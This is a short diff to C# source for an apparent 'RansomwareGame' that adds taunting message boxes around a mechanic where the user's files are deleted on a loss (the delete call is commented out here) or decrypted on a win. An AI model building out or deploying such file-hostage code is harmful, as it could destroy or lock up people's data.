@@ -68,11 +68,15 @@ namespace RansomwareGame
         {
             if (--lives == 0)
             {
+                MessageBox.Show("Say bye to your computer! You obviously didn't care about it.");
+
                 var form5 = new Form5();
                 form5.Show();
             }
             else
             {
+                MessageBox.Show("You lost that round! That file doesn't exist anymore.");
+
                 // Delete current file
                 var path = currentFile.path;
                 // System.IO.File.Delete(path);
@@ -85,11 +89,14 @@ namespace RansomwareGame
         {
             if (++score == 5)
             {
+                MessageBox.Show("You won! Here's everything back >:[");
                 var form6 = new Form6();
                 form6.Show();
             }
             else
             {
+                MessageBox.Show("You won that round! Have the file back as a reward!");
+
                 // Decrypt current file
                 var path = currentFile.path;
                 var userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
